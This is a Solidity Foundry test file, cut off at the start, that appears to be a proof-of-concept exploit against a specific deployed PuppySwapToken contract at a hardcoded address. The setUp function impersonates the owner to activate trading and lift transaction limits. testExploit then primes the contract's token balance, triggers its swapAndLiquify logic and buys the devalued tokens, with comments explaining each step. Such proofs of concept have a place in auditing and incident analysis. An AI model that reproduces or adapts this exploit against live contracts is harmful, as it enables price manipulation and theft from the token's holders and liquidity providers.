    function transfer(address recipient, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function owner() external view returns (address);
    function pancakeRouter() external view returns (address);
    function activateContract() external;
    function approve(address spender, uint256 amount) external returns (bool);
    function setExcludeFromMaxTx(address _address, bool value) external;
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────


    address constant TARGET = 0xeFfAb18108124C2b6280C62abA70a03c79cc4327;
    address attacker = address(this);
    PuppySwapToken token;
    IPancakeRouter02 router;
    address WBNB;
    address owner;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {

        token = PuppySwapToken(TARGET);
        router = IPancakeRouter02(token.pancakeRouter());
        WBNB = router.WETH();
        owner = token.owner();

        // Grant attacker PUPPY tokens and BNB
        deal(TARGET, address(this), 1e22);
        deal(address(this), 100 ether);

        // Impersonate owner to activate contract and exclude attacker from Tx limit
        vm.startPrank(owner);
        token.activateContract();
        token.setExcludeFromMaxTx(address(this), true);
        vm.stopPrank();

        // Add initial liquidity to the pair to allow swaps
        token.approve(address(router), type(uint256).max);
        router.addLiquidityETH{value: 10 ether}(
            TARGET, // token
            1e21, // amountTokenDesired
            0, // amountTokenMin
            0, // amountETHMin
            address(this), // to
            block.timestamp
        );
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        uint256 minTokensToSell = 1e19;

        // 1. Prime the contract by transferring enough tokens to meet the threshold.
        // This transfer will NOT trigger swapAndLiquify because it's checked *before* the balance is updated.
        token.transfer(TARGET, minTokensToSell);

        // 2. Trigger the vulnerable swapAndLiquify function with a small transfer.
        // Now, the contract has a balance > minTokensToSell, so the logic runs.
        token.transfer(address(0xdead), 1);

        // 3. Arbitrage: Swap BNB for the now devalued PUPPY tokens.
        address[] memory path = new address[](2);
        path[0] = WBNB;
        path[1] = TARGET;

        router.swapExactETHForTokens{value: 10 ether}(
            0, // amountOutMin
            path,
            address(this), // to
            block.timestamp
        );
    }



